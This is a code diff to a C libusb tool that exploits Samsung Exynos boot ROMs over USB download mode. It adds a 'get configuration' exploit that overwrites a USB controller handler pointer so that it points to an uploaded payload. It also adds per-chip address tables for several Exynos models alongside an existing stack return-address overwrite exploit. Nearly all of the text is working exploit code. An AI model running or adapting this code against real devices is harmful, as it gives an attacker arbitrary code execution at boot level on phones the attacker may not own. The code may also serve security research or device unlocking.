@@ -9,6 +9,8 @@
 #include <assert.h>
 #include "libusb-1.0/libusb.h"
 
+#include <unistd.h>
+
 #define DEBUG	0
 #define VENDOR_ID	0x04e8
 #define PRODUCT_ID	0x1234
@@ -24,22 +26,90 @@
 enum {
 	NORMAL_MODE = 0,
 	EXPLOIT_MODE,
+	NEWEXPLOIT_MODE,
 };
 
-static char *target_names[] = {
-	"Exynos8890",//TARGET_8890
-	"Exynos8895",//TARGET_8895
-	"Exynos7870",//TARGET_7870
-};
 enum {
 	XFER_BUFFER = 0,//address of buffer where payload is written
 	RA_PTR,//pointer to return address in stack we want to replace
 };
-static uint32_t targets[][2] = {
-	//XFER_BUFFER,	RA_PTR
-	{0x02021800,	0x02020F08},//TARGET_8890
-	{0x02021800,	0x02020F18},//TARGET_8895
-	{0x02021800,	0x02020F08},//TARGET_7870
+
+typedef struct get_conf_data {
+	uint32_t xfer_buffer; //kinda duplicated, whatever
+	uint32_t control_to_struct_offset;
+} get_conf_data;
+
+typedef struct get_conf_usb_struct {
+	uint32_t event_counter;
+	uint32_t endpoint_event_thing;
+	uint32_t trb_type;
+	uint32_t unk;
+	uint64_t xfercomplete_handler_ptr;
+} get_conf_usb_struct;
+
+typedef struct target_data {
+	char* name;
+	uint8_t supports_zero_length_bulk_exploit : 1;
+	uint8_t supports_get_configuration_exploit : 1;
+	uint32_t bulk_exploit_data[2];
+	get_conf_data get_conf_data;
+} target_data;
+
+static target_data targets[] = {
+	{
+		.name = "Exynos8890",
+		.supports_zero_length_bulk_exploit = true,
+		.supports_get_configuration_exploit = false, //should support it, just not tested
+		//XFER_BUFFER,	RA_PTR
+		{0x02021800,	0x02020F08},
+	},
+	{
+		.name = "Exynos8895",
+		.supports_zero_length_bulk_exploit = true,
+		.supports_get_configuration_exploit = false, //should support it, just not tested
+		//XFER_BUFFER,	RA_PTR
+		{0x02021800,	0x02020F18},
+	},
+	{
+		.name = "Exynos7870",
+		.supports_zero_length_bulk_exploit = true,
+		.supports_get_configuration_exploit = true,
+		//XFER_BUFFER,	RA_PTR
+		{0x02021800,	0x02020F08},
+		{0x02021800,	0x350},
+	},
+	{
+		.name = "Exynos7885",
+		.supports_zero_length_bulk_exploit = false,
+		.supports_get_configuration_exploit = true,
+		//XFER_BUFFER,	RA_PTR
+		{0x0, 0x0},
+		{0x02021800,	0x280},
+	},
+	{
+		.name = "Exynos9610",
+		.supports_zero_length_bulk_exploit = false,
+		.supports_get_configuration_exploit = true,
+		//XFER_BUFFER,	RA_PTR
+		{0x0, 0x0},
+		{0x02021800,	0x280},
+	},
+	{
+		.name = "Exynos9830",
+		.supports_zero_length_bulk_exploit = false,
+		.supports_get_configuration_exploit = true,
+		//XFER_BUFFER,	RA_PTR
+		{0x0, 0x0},
+		{0x02022000,	0x480},
+	},
+	{
+		.name = "Exynos3830",
+		.supports_zero_length_bulk_exploit = false,
+		.supports_get_configuration_exploit = true,
+		//XFER_BUFFER,	RA_PTR
+		{0x0, 0x0},
+		{0x02022000,	0x480},
+	},
 };
 
 libusb_device_handle *handle = NULL;
@@ -51,6 +121,42 @@ typedef struct __attribute__ ((__packed__)) dldata_s {
 	u_int8_t data[];
 	//u_int16_t footer;
 } dldata_t;
+
+static int newexploit(dldata_t *payload, int target_id) {
+	int rc;
+	int transferred;
+	uint total_size = payload->size;
+	uint8_t *payload_ptr = (uint8_t *)payload;
+	get_conf_data* target_data = &targets[target_id].get_conf_data;
+	unsigned char response[512];
+	payload->size += BLOCK_SIZE;
+
+	unsigned char test[0x1000];
+	get_conf_usb_struct* usb_struct = (get_conf_usb_struct *)&test[target_data->control_to_struct_offset];
+
+	do {
+		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, payload_ptr, (total_size < BLOCK_SIZE ? total_size : BLOCK_SIZE), &transferred, 0);
+		if(rc) {
+			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
+			return rc;
+		}
+		dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
+		payload_ptr += transferred;
+		assert(total_size>=transferred);
+		total_size -= transferred;
+	} while(total_size > 0);
+
+	rc = libusb_control_transfer(handle, 0x80, 8, 0x0000, 0x0000, test, target_data->control_to_struct_offset + sizeof(get_conf_usb_struct), 0);
+	usb_struct->event_counter += 5;
+	usb_struct->xfercomplete_handler_ptr = target_data->xfer_buffer;
+	rc = libusb_control_transfer(handle, 0x00, 8, 0x0000, 0x0000, test, target_data->control_to_struct_offset + sizeof(get_conf_usb_struct), 0);
+
+	if(rc) {
+		fprintf(stderr, "Error write libusb_control_transfer: %s\n", libusb_error_name(rc));
+		return rc;
+	}
+	return rc;
+}
 
 static int send(dldata_t *payload) {
 	int rc;
@@ -87,12 +193,12 @@ static int exploit(dldata_t *payload, int target_id) {
 	printf("- exploit: starting.\n");
 
 	// step 1 : compute offsets,sizes,etc...
-	dprint("targets[target_id][XFER_BUFFER] = 0x%x\n", targets[target_id][XFER_BUFFER]);
-	dprint("targets[target_id][RA_PTR] = 0x%x\n", targets[target_id][RA_PTR]);
-	if(targets[target_id][XFER_BUFFER] < targets[target_id][RA_PTR])
-		printf("ERROR : targets[target_id][XFER_BUFFER] < targets[target_id][RA_PTR]\n");
-	uint32_t padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER];
-	dprint("padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER] = 0x%x\n", padding_size);
+	dprint("targets[target_id].bulk_exploit_data[XFER_BUFFER] = 0x%x\n", targets[target_id].bulk_exploit_data[XFER_BUFFER]);
+	dprint("targets[target_id].bulk_exploit_data[RA_PTR] = 0x%x\n", targets[target_id].bulk_exploit_data[RA_PTR]);
+	if(targets[target_id].bulk_exploit_data[XFER_BUFFER] < targets[target_id].bulk_exploit_data[RA_PTR])
+		printf("ERROR : targets[target_id].bulk_exploit_data[XFER_BUFFER] < targets[target_id].bulk_exploit_data[RA_PTR]\n");
+	uint32_t padding_size = targets[target_id].bulk_exploit_data[RA_PTR] - targets[target_id].bulk_exploit_data[XFER_BUFFER];
+	dprint("padding_size = targets[target_id].bulk_exploit_data[RA_PTR] - targets[target_id].bulk_exploit_data[XFER_BUFFER] = 0x%x\n", padding_size);
 	uint32_t original_payload_size = payload->size;
 	dprint("original_payload_size = 0x%x\n", original_payload_size);
 	if(original_payload_size > BLOCK_SIZE)//maximum size of first bulk transfer
@@ -115,16 +221,16 @@ static int exploit(dldata_t *payload, int target_id) {
 		padding_size = BLOCK_SIZE;//TODO hmmm no!
 		dprint("new padding_size = 0x%x\n", padding_size);
 	}
-	uint32_t ram_size = padding_size + sizeof(targets[target_id][XFER_BUFFER]) + 2;//the pointer we overwrite is at the end, and we need to 2 extra bytes for footer
+	uint32_t ram_size = padding_size + sizeof(targets[target_id].bulk_exploit_data[XFER_BUFFER]) + 2;//the pointer we overwrite is at the end, and we need to 2 extra bytes for footer
 	dprint("ram_size = 0x%x\n", ram_size);
 
 	// step 2 : prepare payload
 	uint8_t *ram = (uint8_t*)calloc(1, ram_size);
-	*(uint32_t*)&ram[padding_size] = targets[target_id][XFER_BUFFER];//overwriting return address in stack :]
+	*(uint32_t*)&ram[padding_size] = targets[target_id].bulk_exploit_data[XFER_BUFFER];//overwriting return address in stack :]
 	payload->size = original_payload_size + (CHUNK_SIZE * chunk_cnt) + (BLOCK_SIZE * block_cnt) + ram_size;
 	dprint("malicious payload->size=0x%x\n", payload->size);
 
-	uint32_t min_size_to_overflw = (uint32_t)0 - targets[target_id][XFER_BUFFER];
+	uint32_t min_size_to_overflw = (uint32_t)0 - targets[target_id].bulk_exploit_data[XFER_BUFFER];
 	dprint("min_size_to_overflw = 0x%x\n", min_size_to_overflw);
 	if(min_size_to_overflw > payload->size)
 		printf("ERROR : min_size_to_overflw > payload->size\n");
@@ -138,7 +244,7 @@ static int exploit(dldata_t *payload, int target_id) {
 		return rc;
 	}
 	#if DEBUG
-	uint32_t xfer_buffer = targets[target_id][XFER_BUFFER];
+	uint32_t xfer_buffer = targets[target_id].bulk_exploit_data[XFER_BUFFER];
 	xfer_buffer += CHUNK_SIZE + (transferred - 8);//initial bulk transfer has already increased xfer_buffer by CHUNK_SIZE one time.
 	dprint("xfer_buffer=0x%x\n", xfer_buffer);
 	usb_size = (payload->size - transferred) - CHUNK_SIZE;
@@ -216,9 +322,9 @@ static int identify_target()
 	if (desc.iProduct) {
 		rc = libusb_get_string_descriptor_ascii(handle, desc.iProduct, product, sizeof(product));
 		if (rc > 0){
-			for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++){
-				if(!strcmp(target_names[i], (char *)product)){
-					printf("Target: %s\n", target_names[i]);
+			for(i = 0; i < sizeof(targets)/sizeof(targets[0]); i++){
+				if(!strcmp(targets[i].name, (char *)product)){
+					printf("Target: %s\n", targets[i].name);
 					return i;
 				}
 			}
@@ -272,7 +378,10 @@ int main(int argc, char *argv[])
 	}
 
 	if(argv[1] && argv[1][0] == 'e')
-		mode = EXPLOIT_MODE;
+		if (argv[1][1] != '2')
+			mode = EXPLOIT_MODE;
+		else
+			mode = NEWEXPLOIT_MODE;
 	else
 		mode = NORMAL_MODE;
 
@@ -331,7 +440,43 @@ int main(int argc, char *argv[])
 
 	if(mode == EXPLOIT_MODE){
 		target_id = identify_target();
-		exploit(payload, target_id);
+		if (targets[target_id].supports_zero_length_bulk_exploit) {
+			exploit(payload, target_id);
+
+			if(argv[3]){
+				rc = save_received_data(argv[3]);
+				if(rc > 0){
+					printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
+				}
+			}
+		} else {
+			fprintf(stderr, "This device does not support the zero-length bulk transfer exploit!\n");
+		}
+	}else if (mode == NEWEXPLOIT_MODE){
+		target_id = identify_target();
+		if (targets[target_id].supports_get_configuration_exploit) {
+			printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
+			rc = newexploit(payload, target_id);
+			if(!rc)
+				printf("File %s sent !\n", argv[2]);
+
+			if(argv[3]){
+				sleep(2);
+				handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
+				rc = libusb_claim_interface(handle, 0);
+				rc = save_received_data(argv[3]);
+				if(rc > 0){
+					printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
+				}
+			}
+		} else {
+			fprintf(stderr, "This device does not support the get configuration exploit!\n");
+		}
+	}else{// NORMAL_MODE
+		printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
+		rc = send(payload);
+		if(!rc)
+			printf("File %s sent !\n", argv[2]);
 
 		if(argv[3]){
 			rc = save_received_data(argv[3]);
@@ -339,11 +484,6 @@ int main(int argc, char *argv[])
 				printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
 			}
 		}
-	}else{// NORMAL_MODE
-		printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
-		rc = send(payload);
-		if(!rc)
-			printf("File %s sent !\n", argv[2]);
 	}
 	#if DEBUG
 	sleep(5);
